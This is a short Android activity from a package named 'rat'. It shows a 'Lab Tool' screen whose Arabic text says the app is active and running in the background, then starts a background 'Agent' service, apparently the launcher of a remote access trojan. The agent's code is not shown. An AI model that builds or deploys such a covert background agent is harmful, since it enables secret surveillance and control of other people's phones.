package com.lab.rat;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.TextView;
public class Main extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        TextView t = new TextView(this);
        t.setText("Lab Tool\n\nمفعل. التطبيق شغال في الخلفية.");
        t.setPadding(40, 100, 40, 40);
        t.setTextSize(18);
        setContentView(t);
        startService(new Intent(this, Agent.class));
    }
}
